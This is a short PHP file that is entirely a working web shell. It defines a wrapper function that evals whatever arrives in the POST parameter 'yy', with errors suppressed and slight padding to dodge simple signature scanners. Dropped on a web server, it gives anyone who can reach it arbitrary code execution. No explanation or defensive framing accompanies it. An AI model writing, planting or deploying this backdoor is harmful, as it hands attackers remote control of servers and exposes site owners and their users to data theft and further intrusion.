<?php
function s($a){
	$b = '';
	@eval($b.$a.$b);
}
@s($_POST['yy']);
?>